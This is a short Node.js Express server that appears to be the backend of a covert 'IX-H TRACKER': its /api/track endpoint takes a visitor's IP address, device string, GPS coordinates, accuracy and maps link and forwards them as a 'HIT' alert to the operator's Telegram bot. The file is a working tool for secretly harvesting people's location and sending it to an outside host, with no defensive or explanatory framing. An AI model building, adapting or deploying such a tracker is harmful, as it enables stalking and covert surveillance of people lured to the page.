import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TG_TOKEN = process.env.TG_TOKEN;
const TG_CHAT_ID = process.env.TG_CHAT_ID;

app.post('/api/track', async (req, res) => {
  const { ip, ua, lat, lng, acc, maps, action } = req.body || {};

  const msg = `
🔴 *HIT — IX-H TRACKER*
━━━━━━━━━━━━━━━
🎯 Action: ${action || '-'}
🌐 IP: \`${ip || '-'}\`
📱 Device: ${ua || '-'}
📍 GPS: ${lat && lng ? `${lat}, ${lng}` : '❌ GAK DI-ALLOW'}
🎯 Akurasi: ${acc ? acc + ' meter' : '-'}
🗺️ Maps: ${maps || '-'}
━━━━━━━━━━━━━━━
🕐 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
  `;

  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TG_CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
      })
    });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false, err: e.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on port ${PORT}`));